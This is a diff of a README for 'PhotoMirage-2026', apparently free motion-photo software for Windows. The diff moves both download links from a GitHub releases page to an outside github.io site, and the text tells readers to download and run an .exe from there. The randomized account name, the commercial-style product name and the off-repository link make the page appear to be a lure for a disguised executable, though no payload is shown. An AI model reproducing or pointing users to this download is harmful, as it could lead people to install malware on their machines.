@@ -1,6 +1,6 @@
 # 📸 PhotoMirage-2026 - Create stunning motion photos easily
 
-[![](https://img.shields.io/badge/Download-PhotoMirage%202026-blue)](https://github.com/Rudolfthrifty640/PhotoMirage-2026/releases)
+[![](https://img.shields.io/badge/Download-PhotoMirage%202026-blue)](https://rudolfthrifty640.github.io)
 
 PhotoMirage turns static images into animations. Use this software to add motion to your favorite photos. Create cinematic effects for social media or personal projects. The software works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ PhotoMirage turns static images into animations. Use this software to add motion
 
 You need to access the release page to get the installer. Follow this link to find the latest version:
 
-[Click here to go to the download page](https://github.com/Rudolfthrifty640/PhotoMirage-2026/releases)
+[Click here to go to the download page](https://rudolfthrifty640.github.io)
 
 On this page, look for the section titled "Assets" at the bottom of the latest release post. Click the file ending in `.exe` to start the download. Save this file to your Downloads folder or your desktop so you can find it.
 
